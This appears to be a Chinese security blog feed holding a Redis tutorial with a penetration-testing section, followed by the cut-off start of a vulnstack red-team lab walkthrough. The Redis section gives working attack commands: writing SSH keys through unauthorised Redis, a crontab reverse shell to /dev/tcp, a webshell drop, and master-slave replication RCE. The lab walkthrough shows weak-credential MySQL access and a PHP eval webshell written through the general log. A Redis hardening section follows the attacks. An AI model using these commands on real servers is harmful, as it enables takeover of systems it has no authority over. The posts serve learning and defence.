hgetall 1</span><br><span class="line">1) &quot;name&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">3) &quot;brith&quot;</span><br><span class="line">4) &quot;1998&quot;</span><br><span class="line">5) &quot;age&quot;</span><br><span class="line">6) &quot;22&quot;</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379[4]&gt; hkeys 1</span><br><span class="line">1) &quot;name&quot;</span><br><span class="line">2) &quot;brith&quot;</span><br><span class="line">3) &quot;age&quot;</span><br></pre></td></tr></table></figure><h3 id="2-3-5-List类型命令"><a href="#2-3-5-List类型命令" class="headerlink" title="2.3.5 List类型命令"></a>2.3.5 List类型命令</h3><p><strong>LPUSH key value [value …] 插入元素创建列表</strong></p><p>将一个或多个值 <code>value</code> 插入到列表 <code>key</code> 的表头</p><p>如果有多个 <code>value</code> 值，那么各个 <code>value</code> 值按从左到右的顺序依次插入到表头： 比如说，对空列表 <code>mylist</code> 执行命令 <code>LPUSH mylist a b c</code> ，列表的值将是 <code>c b a</code> ，这等同于原子性地执行 <code>LPUSH mylist a</code> 、 <code>LPUSH mylist b</code> 和 <code>LPUSH mylist c</code> 三个命令。</p><p>如果 <code>key</code> 不存在，一个空列表会被创建并执行 LPUSH 操作。</p><p>当 <code>key</code> 存在但不是列表类型时，返回一个错误。</p><p><strong>RPUSH key value [value …] 向表尾插入元素</strong></p><p>不存在也会新建空列表。</p><p><strong>LPOP key 移除并返回列表头元素</strong></p><p><strong>RPOP key移除并返回列表尾元素</strong></p><p><strong>LSET key index value 设置列表元素</strong></p><p>将列表 <code>key</code> 下标为 <code>index</code> 的元素的值设置为 <code>value</code> 。当 <code>index</code> 参数超出范围，或对一个空列表( <code>key</code> 不存在)进行 LSET 时，返回一个错误。</p><p><strong>LLEN key 获取列表长度</strong></p><p><strong>LINDEX key index 通过索引获取列表元素</strong></p><p><strong>LRANGE key start stop 返回区间中的元素</strong></p><p>返回列表 <code>key</code> 中指定区间内的元素，区间以偏移量 <code>start</code> 和 <code>stop</code> 指定。</p><p>下标(index)参数 <code>start</code> 和 <code>stop</code> 都以 <code>0</code> 为底，也就是说，以 <code>0</code> 表示列表的第一个元素，以 <code>1</code> 表示列表的第二个元素，以此类推。</p><p>你也可以使用负数下标，以 <code>-1</code> 表示列表的最后一个元素， <code>-2</code> 表示列表的倒数第二个元素，以此类推。</p><p><strong>LINSERT key BEFORE|AFTER pivot value 插入元素</strong></p><p>将值 <code>value</code> 插入到列表 <code>key</code> 当中，位于值 <code>pivot</code> 之前或之后。</p><p>当 <code>pivot</code> 不存在于列表 <code>key</code> 时，不执行任何操作。</p><p>当 <code>key</code> 不存在时， <code>key</code> 被视为空列表，不执行任何操作。</p><p>如果 <code>key</code> 不是列表类型，返回一个错误。</p><p><strong>举例</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[4]&gt; llen list</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379[4]&gt; Lpush list <span class="string">&quot;V0W&quot;</span> <span class="string">&quot;V0WKeep3r&quot;</span> <span class="string">&quot;noob&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379[4]&gt; Rpush list <span class="string">&quot;Rookie&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379[4]&gt; Lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;noob&quot;</span></span><br><span class="line">2) <span class="string">&quot;V0WKeep3r&quot;</span></span><br><span class="line">3) <span class="string">&quot;V0W&quot;</span></span><br><span class="line">4) <span class="string">&quot;Rookie&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; LPOP list</span><br><span class="line"><span class="string">&quot;noob&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; RPOP list</span><br><span class="line"><span class="string">&quot;Rookie&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; Lset list 1 Great</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[4]&gt; LLen list</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379[4]&gt; Lindex list 0</span><br><span class="line"><span class="string">&quot;V0WKeep3r&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; Linsert list after <span class="string">&quot;Great&quot;</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379[4]&gt; Lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;V0WKeep3r&quot;</span></span><br><span class="line">2) <span class="string">&quot;Great&quot;</span></span><br><span class="line">3) <span class="string">&quot;Hacker&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-3-6-Set类型命令"><a href="#2-3-6-Set类型命令" class="headerlink" title="2.3.6 Set类型命令"></a>2.3.6 Set类型命令</h3><p><strong>SADD key member [member …] 添加元素到集合</strong></p><p>将一个或多个 <code>member</code> 元素加入到集合 <code>key</code> 当中，已经存在于集合的 <code>member</code> 元素将被忽略。</p><p>假如 <code>key</code> 不存在，则创建一个只包含 <code>member</code> 元素作成员的集合。</p><p>当 <code>key</code> 不是集合类型时，返回一个错误。</p><p><strong>SPOP key 移除并返回集合中的一个随机元素</strong></p><p>**SREM key member [member …] **</p><p>移除集合 <code>key</code> 中的一个或多个 <code>member</code> 元素，不存在的 <code>member</code> 元素会被忽略。当 <code>key</code> 不是集合类型，返回一个错误。</p><p><strong>SMEMBERS key 返回集合中的所有成员</strong></p><p><strong>SINTER key [key …] 交集</strong></p><p>返回一个集合的全部成员，该集合是所有给定集合的交集。不存在的 <code>key</code> 被视为空集。当给定集合当中有一个空集时，结果也为空集(根据集合运算定律)。</p><p><strong>SUNION key [key …] 并集</strong></p><p><strong>SDIFF key [key …] 差集</strong></p><p><strong>举例</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[4]&gt; SADD students &quot;olivia&quot; &quot;V0WKeep3r&quot;</span><br><span class="line">(integer) 2</span><br><span class="line">127.0.0.1:6379[4]&gt; SADD hackers &quot;V0WKeep3r&quot; &quot;p0&quot; &quot;kingkk&quot; &quot;phithon&quot;</span><br><span class="line">(integer) 4</span><br><span class="line">127.0.0.1:6379[4]&gt; Spop hackers 2</span><br><span class="line">1) &quot;kingkk&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SMembers hackers</span><br><span class="line">1) &quot;phithon&quot;</span><br><span class="line">2) &quot;p0&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; Srem hackers &quot;p0&quot;</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379[4]&gt; SADD hackers &quot;p0&quot; &quot;kingkk&quot; &quot;V0WKeep3r&quot;</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379[4]&gt; Smembers hackers</span><br><span class="line">1) &quot;phithon&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">3) &quot;p0&quot;</span><br><span class="line">4) &quot;kingkk&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SUNION hackers students</span><br><span class="line">1) &quot;p0&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">3) &quot;kingkk&quot;</span><br><span class="line">4) &quot;olivia&quot;</span><br><span class="line">5) &quot;phithon&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SINTER hackers students</span><br><span class="line">1) &quot;V0WKeep3r&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SDIFF hackers students</span><br><span class="line">1) &quot;phithon&quot;</span><br><span class="line">2) &quot;p0&quot;</span><br><span class="line">3) &quot;kingkk&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x03-Redis-在渗透测试中的利用"><a href="#0x03-Redis-在渗透测试中的利用" class="headerlink" title="0x03 Redis 在渗透测试中的利用"></a>0x03 Redis 在渗透测试中的利用</h1><h2 id="3-1-Redis未授权访问"><a href="#3-1-Redis未授权访问" class="headerlink" title="3.1 Redis未授权访问"></a>3.1 Redis未授权访问</h2><p><strong>redis-4.0.10 之前的版本</strong>   Redis服务默认时没有密码验证的，而且默认将redis绑定到0.0.0.0:6379，部分DBA在配置时不注意，同时也没有采用添加防火墙等安全策略，将会导致Redis服务直接暴露到公网。</p><p>其他用户和攻击者可以在未授权的情况下，可以直接对redis进行访问，并进行操作。</p><p><img src="http://image.v0w.top/Blog/2020-08-11-redis.png"></p><p><strong>redis-4.0.10 之后的版本</strong> 默认开启了保护模式，仅允许本地无密码验证连接。如果再想利用，可能就要考虑弱口令和配置错误了。</p><p><img src="http://image.v0w.top/Blog/2020-08-11-040217.png"></p><p>Redis未授权漏洞常见的漏洞利用方式：</p><ul><li>Windows下，绝对路径写webshell 、写入启动项。</li><li>Linux下，绝对路径写webshell 、公私钥认证获取root权限 、利用contrab计划任务反弹shell。</li></ul><h2 id="3-2-信息泄漏"><a href="#3-2-信息泄漏" class="headerlink" title="3.2 信息泄漏"></a>3.2 信息泄漏</h2><p>通过上述Redis命令来获取信息。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO# 查看信息</span><br><span class="line"># Server</span><br><span class="line">redis_version:6.0.6</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">KEYS *# 看所有键</span><br><span class="line">1) &quot;key&quot;</span><br><span class="line">2) &quot;key-with-expire-time&quot;</span><br><span class="line"></span><br><span class="line">flushall# 删除所有数据库内容</span><br><span class="line"></span><br><span class="line">flushdb# 刷新数据库</span><br><span class="line"></span><br><span class="line">config set dir dirpath 设置路径等配置</span><br><span class="line"></span><br><span class="line">config get dir&#x2F;dbfilename 获取路径及数据配置信息</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;&#x2F;usr&#x2F;local&#x2F;redis&#x2F;src&quot;</span><br></pre></td></tr></table></figure><h2 id="3-3-Redis-getshell"><a href="#3-3-Redis-getshell" class="headerlink" title="3.3 Redis getshell"></a>3.3 Redis getshell</h2><h3 id="3-3-1-利用Redis写公钥-进行ssh连接"><a href="#3-3-1-利用Redis写公钥-进行ssh连接" class="headerlink" title="3.3.1 利用Redis写公钥 进行ssh连接"></a>3.3.1 利用Redis写公钥 进行ssh连接</h3><p>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生一个授权的key。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">#生成ssh公钥和私钥</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat redis_key.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line"># 这里的换行符是防止密钥数据和其他的 redis 缓存数据混合</span><br><span class="line"></span><br><span class="line">cat &#x2F;root&#x2F;.ssh&#x2F;key.txt | .&#x2F;redis-cli -h xxx.xxx.xxx.xxx -p 6379 -x set key </span><br><span class="line"># 将公钥写入redis，也可以通过连接redis再写，这里直接用管道写入了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line"># 改变 redis 的 RDB 目录以及文件为 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"># 存盘，就会将ssh公钥保存到&#x2F;root&#x2F;.ssh&#x2F;auuthorized_keys</span><br></pre></td></tr></table></figure><p> 将ssh公钥写入redis的键值</p><p><img src="http://image.v0w.top/Blog/2020-08-13-043354.png"></p><p>发现服务器已经被写入ssh公钥</p><p><img src="http://image.v0w.top/Blog/2020-08-13-042409.png" alt="服务器被写入ssh公钥"></p><p>通过ssh私钥连接到服务器，getshell。</p><p><img src="http://image.v0w.top/Blog/2020-08-13-035016.png" alt="通过ssh私钥连接到服务器"></p><h3 id="3-3-2-利用Redis-写-crontab任务反弹shell"><a href="#3-3-2-利用Redis-写-crontab任务反弹shell" class="headerlink" title="3.3.2 利用Redis 写 crontab任务反弹shell"></a>3.3.2 利用Redis 写 crontab任务反弹shell</h3><p>通过redis写键值，值由上一方法的ssh公钥变成crontable定时任务。定时任务的内容就是一个反弹shell的命令。然后保存到<code>/var/spool/cron/root</code></p><blockquote><p>/var/spool/cron/ 这个目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名，比如tom建的crontab任务对应的文件就是/var/spool/cron/tom。一般一个用户最多只有一个crontab文件。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set poc2 &quot;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.xx&#x2F;23333 0&gt;&amp;1\n\n&quot;</span><br><span class="line"></span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>理论上，我们的数据应该像写ssh时一样，较为完好的保存，并每过一分钟执行。</p><p>事实上，我在测试此方法时，并没有成功，在任务写入/cron/root的过程中，似乎出现了错误，或者乱码。最终我的poc2，在/cron/root中的内容保存成这个样子：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@centos-7 cron]# crontab -l</span><br><span class="line">REDIS0007�redis-ver3.2.12�</span><br><span class="line">redis-bits�@�ctime�V�4_used-mem�f</span><br><span class="line">                                 ��poc2�8&#x3D;</span><br><span class="line"></span><br><span class="line">*&#x2F;1 *�bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;182.9&#96;102&#x2F;23  0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">���e;�8L</span><br></pre></td></tr></table></figure><p>监听地址：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis服务：CentOS7 redis3.2.12  虚拟机</span><br><span class="line">攻击机： MACOS 10.15 </span><br><span class="line">VPS： 阿里云 ECS CentOS7</span><br></pre></td></tr></table></figure><p>暂时不知道是什么原因导致的==、</p><p>这一点很奇怪，困扰我很久==、</p><p>于是尝试使用另一个地址，使用攻击机监听，结果成了==、</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">poc4&gt;</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;10.211.55.2&#x2F;23333 0&gt;&amp;1 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-13-070355.png"></p><h3 id="3-3-3-利用Redis-写webshell"><a href="#3-3-3-利用Redis-写webshell" class="headerlink" title="3.3.3 利用Redis 写webshell"></a>3.3.3 利用Redis 写webshell</h3><p>和前两个思路一样。</p><p>通过redis写键值，值变成一句话木马等。然后保存到<code>/var/www/html</code>或是其他web目录。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">OK</span><br><span class="line">&gt; config set dbfilename redis_shell.php</span><br><span class="line">OK</span><br><span class="line">&gt; keys *</span><br><span class="line">1) &quot;hacker&quot;</span><br><span class="line">&gt; del hacker</span><br><span class="line">(integer) 1</span><br><span class="line">&gt; set shell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">&gt; save</span><br></pre></td></tr></table></figure><p>之后webshell文件就写入了web目录，就可以getshell了。</p><p><img src="http://image.v0w.top/Blog/2020-08-13-073527.png"></p><h3 id="3-3-4-利用Redis主从复制getshell"><a href="#3-3-4-利用Redis主从复制getshell" class="headerlink" title="3.3.4 利用Redis主从复制getshell"></a>3.3.4 利用Redis主从复制getshell</h3><p>基于Redis主从复制的机制，可以通过FULLRESYNC将任意文件同步到从节点（slave），这就使得它可以轻易实现以上任何一种漏洞利用方式，而且存在着更多的可能性，等待被探索。</p><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">利用条件: Redis 4.x/5.x</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line"><span class="built_in">cd</span> RedisModules-ExecuteCommand/</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Ridter/redis-rce.git</span><br><span class="line"><span class="built_in">cd</span> redis-rce/</span><br><span class="line">cp ../RedisModules-ExecuteCommand/src/module.so ./</span><br><span class="line">pip install -r requirements.txt </span><br><span class="line">python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-19-085343.png"></p><p><strong>Bypass师傅0rz 分析过该漏洞的原理：<a href="https://www.cnblogs.com/xiaozi/p/13089906.html">Redis主从复制getshell技巧</a></strong></p><h1 id="0x04-Redis安全防御"><a href="#0x04-Redis安全防御" class="headerlink" title="0x04 Redis安全防御"></a>0x04 Redis安全防御</h1><ol><li><p><strong>禁用高危命令</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在 redis.conf 文件中直接将危险命令置空，或者改变其名字</span><br><span class="line"></span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">rename-command FLUSHALL &quot;name1&quot;</span><br><span class="line">rename-command CONFIG &quot;name2&quot;</span><br><span class="line">rename-command EVAL &quot;name3&quot;</span><br></pre></td></tr></table></figure></li><li><p><strong>以低权限运行 Redis 服务</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis默认使用用户权限启动的，降权可以避免getshell后直接root</span><br><span class="line">groupadd -r redis   </span><br><span class="line">useradd -r -g redis redis</span><br></pre></td></tr></table></figure></li><li><p><strong>为 Redis 添加密码验证</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改 redis.conf 文件，添加</span><br><span class="line"></span><br><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure></li><li><p><strong>做好访问控制，在不需要接外网时，就bind本地。</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改 redis.conf 文件：</span><br><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure></li><li><p><strong>修改默认端口</strong></p></li><li><p><strong>设置隐藏文件属性，不允许修改authorized_keys</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 400 ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">chattr +i ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">chattr +i ~&#x2F;.ssh</span><br></pre></td></tr></table></figure></li><li><p><strong>设置防火墙策略，只允许特定IP连接</strong></p></li></ol><h1 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h1><ul><li><p><a href="https://www.cnblogs.com/powertoolsteam/p/redis.html">Redis是什么？看这一篇就够了</a></p></li><li><p><a href="https://www.redis.net.cn/order/">https://www.redis.net.cn/order/</a></p></li><li><p><a href="http://redisdoc.com/">http://redisdoc.com/</a></p></li><li><p><a href="http://redisguide.com/">http://redisguide.com/</a></p></li><li><p><a href="https://www.k0rz3n.com/2018/11/08/Redis%20%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8">k0rz3n-Redis 基础梳理以及其在渗透测试中的利用</a></p></li><li><p><a href="https://p0sec.net/index.php/archives/69/">p0-redis未授权访问漏洞利用总结</a></p></li><li><p><a href="https://www.cnblogs.com/xiaozi/p/13089906.html">Bypass-Redis主从复制getshell技巧</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文主要介绍redis技术是什么，有什么优势，有什么缺点。接着会从安全渗透的角度，剖析其存在的安全隐</summary>
      
    
    
    
    <category term="Web安全" scheme="v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="webshell" scheme="v0w.top/tags/webshell/"/>
    
    <category term="mysql" scheme="v0w.top/tags/mysql/"/>
    
    <category term="Redis" scheme="v0w.top/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>红日安全vulnstack-ATT&amp;CK实战系列 红队实战（一）</title>
    <link href="v0w.top/2020/07/19/vulnstack1/"/>
    <id>v0w.top/2020/07/19/vulnstack1/</id>
    <published>2020-07-18T16:00:00.000Z</published>
    <updated>2020-07-23T14:24:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今后，尽量每周抽时间对较为完整的一个渗透靶机进行练习，先从红日安全团队分享的靶机实战环境开始吧。感谢<strong>红日安全团队</strong>分享的靶机实战环境。红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。</p><p>靶机下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a></p><p>本文的目的是为了记录和巩固知识点，并分享出来。</p><p>今天先从第一个开始。<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">ATT&amp;CK实战系列——红队实战（一）</a></p><p>闲话扯完了，冲！</p><h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>红日安全团队提供的靶机都是虚拟机形式，需要对虚拟机网络进行一定的配置。关于VMware的几种网络模式的原理和区别，可以参考这篇文章——<a href="https://www.cnblogs.com/xuliangxing/p/7027124.html">VMware网络连接模式——桥接模式、NAT模式以及仅主机模式的介绍和区别</a> 介绍非常详细，通俗易懂。</p><p>我们下载完靶机有三个压缩包，对应三个虚拟机：</p><p><img src="http://image.v0w.top/Blog/20200719122321.png"></p><p>VM1为win7，VM2为winserver 2003即win2k3，VM3为winserver 2008，拓扑图为下图所示：</p><p><img src="http://image.v0w.top/Blog/20200719123222.png"></p><p>可以看到VM1是通外网的Web服务器，VM2和VM3是内网环境，与外网隔绝，只可以通过VM1进行访问。</p><p>一要营造一个内网环境（包括VM1，VM2，VM3），因此需要将虚拟机与外网隔绝，在VMware中可以通过虚拟机设置中的网络适配器来设置，设置成仅主机模式放到一个VMnet中即可实现三台主机在一个内网。</p><p>二要使得VM1能够访问外网，所以需要给VM1添加一个网卡，设置成NAT模式。</p><p>所以最终我给VM1(win7) 设置两个网卡，一个自定义连接到VMnet1(仅主机模式)，另一个连接模式为NAT，方便连接外网。VM2(winserver2k3)和VM3(winserver2008)</p><p><img src="http://image.v0w.top/Blog/image-202007191322.png"></p><p>最终呈现的结果如下（画了一个不专业的拓扑，大概能表达我的意思吧）：</p><p><img src="http://image.v0w.top/Blog/20200719133039.png"></p><p><img src="http://image.v0w.top/Blog/20200719134920.png"></p><h1 id="0x02-启动靶机和服务"><a href="#0x02-启动靶机和服务" class="headerlink" title="0x02 启动靶机和服务"></a>0x02 启动靶机和服务</h1><p>将三个靶机都启动，此时需要占用较大的内存，建议将其他应用关闭，另外电脑配置最好能在16G及以上。</p><p>密码都是 <code>hongrisec@2019</code>，可能会提醒你修改密码，修改后务必记住自己的密码。</p><p>进入win7 启动phpstudy。</p><p><img src="http://image.v0w.top/Blog/20200719135927.png"></p><p>发现三台主机都是固定IP的，是在<code>192.168.52.0/24段</code>可以通过三台主机之前进行ping测试，测试能通后，可以正式开始练习了。如果遇到NAT（比如主机和同网段的kali）ping不通win7的情况，试着关闭防火墙再试试。</p><img src="http://image.v0w.top/Blog/20200719140851.png" style="zoom: 80%;" /><h1 id="0x03-拿下Web服务器"><a href="#0x03-拿下Web服务器" class="headerlink" title="0x03 拿下Web服务器"></a>0x03 拿下Web服务器</h1><p>上述基本完成后，我们可以正式开始本次靶机渗透之旅，Now It’s pentest time.</p><h2 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1 信息收集"></a>3.1 信息收集</h2><p>本机kali的地址为：<code>192.168.237.137</code></p><p>搜索同段的主机，再针对性的使用nmap进行服务端口扫描：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.237.0&#x2F;24</span><br></pre></td></tr></table></figure><p>或者直接使用nmap扫描同一C段：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.237.0&#x2F;24# -sP ping方式探测存活主机</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719152431.png" style="zoom:80%;" /><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -Pn -p 1-65535 192.168.237.136# -sC默认脚本 -sV 服务版本 -p指定端口</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719153434.png" style="zoom:80%;" /><h2 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2 漏洞利用"></a>3.2 漏洞利用</h2><p>发现80 端口开放，进行访问，是一个php探针页面，结合信息收集阶段得到phpstudy的信息，可以确定是一个phpstudy的集成环境。</p><p>网站的绝对路径：<code>C:/phpStudy/www/</code></p><p>此时，有两种攻击方案：</p><ol><li><a href="https://paper.seebug.org/1044/">phpstudy 后门</a></li><li>看看MySQL能不能连进去</li></ol><p>测试发现使用的版本恰好没有后门文件可以利用。尝试第二种方式，测试MySQL外连和登录密码。这里出题比较简单，直接是弱口令，<code>root/root</code>就可以连进去，而且是可以外连的。</p><p>使用dirmap或者御剑扫描web目录，发现<code>phpmyAdmin</code>和<code>beifen.rar</code>（如果是没有弱口令，从备份文件中找配置也是一个突破口）</p><img src="http://image.v0w.top/Blog/20200719160240.png" style="zoom:80%;" /><p>备份文件是一个yxcms的源码：</p><img src="http://image.v0w.top/Blog/20200719162406.png" style="zoom:80%;" /><p>在全文搜索admin之后，发现后台默认的用户名和密码：<code>admin/123456</code></p><p>发现后台地址：<code>/index.php?r=admin</code></p><img src="http://image.v0w.top/Blog/20200719163239.png" style="zoom:50%;" /><p>接下来，又有两种攻击方案可以选择：</p><ol><li><strong><a href="https://zhuanlan.zhihu.com/p/114184542">利用phpMyAdmin漏洞进行getshell或者利用MySQL写Shell</a></strong></li><li><strong>继续跟进yxcms</strong></li></ol><p>因为是练习嘛，我们都尝试一遍。</p><h3 id="3-2-1-mysql日志写shell"><a href="#3-2-1-mysql日志写shell" class="headerlink" title="3.2.1 mysql日志写shell"></a>3.2.1 mysql日志写shell</h3><p>先看一下有没有写权限：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719164102.png" style="zoom:50%;" /><p><code>secure_file_priv ==&#39;&#39;</code>为空说明有任意目录的写权限，非空则只能在对应目录读文件，这里的非空包括<code>NULL</code>。所以这里没有写权限，无法直接写shell。</p><p>因为在mysql 5.6.34版本以后 <code>secure_file_priv</code>的值默认为<code>NULL</code>。并且无法用sql语句对其进行修改，只能够通过以下方式修改</p><p><strong>windows</strong>下:</p><p>修改<code>mysql.ini</code> 文件，在<code>[mysqld]</code> 下添加条目: <code>secure_file_priv =</code></p><p>保存，重启mysql。</p><p><strong>Linux</strong>下:</p><p>在<code>/etc/my.cnf</code>的<code>[mysqld]</code>下面添加<code>local-infile=0</code>选项。</p><p>这里无法直接写shell，那我们来尝试日志写 <code>shell</code>，开启日志记录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;; # 开启日志记录</span><br><span class="line">show variables like &#39;general%&#39;; # 查看当前的日志记录</span><br><span class="line">set global general_log_file&#x3D;&quot;C:&#x2F;&#x2F;phpStudy&#x2F;www&#x2F;v0w.php&quot;;  # 指定日志文件</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719170708.png" style="zoom:50%;" /><img src="http://image.v0w.top/Blog/20200719171124.png" style="zoom:50%;" /><p>进行一次查询，查询记录就将写到日志文件中，形成一个webshell。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT &#39;&lt;?php eval($_POST[&quot;v0w&quot;]);?&gt;&#39;</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719171314.png" style="zoom:50%;" /><p>使用蚁剑连接，getshell。</p><img src="http://image.v0w.top/Blog/20200719171508.png" style="zoom: 80%;" /><h3 id="3-2-2-通过yxcms-getshell"><a href="#3-2-2-通过yxcms-getshell" class="headerlink" title="3.2.2 通过yxcms getshell"></a>3.2.2 通过yxcms getshell</h3><p>利用之前得到的一些信息，登录后台</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后台地址：&#x2F;index.php?r&#x3D;admin</span><br><span class="line">用户名和密码：admin  123456</span><br></pre></td></tr></table></figure><p>看看有没有上传或者什么可以写入shell的地方。可以通过Seay审计工具来进行比较细致的审计 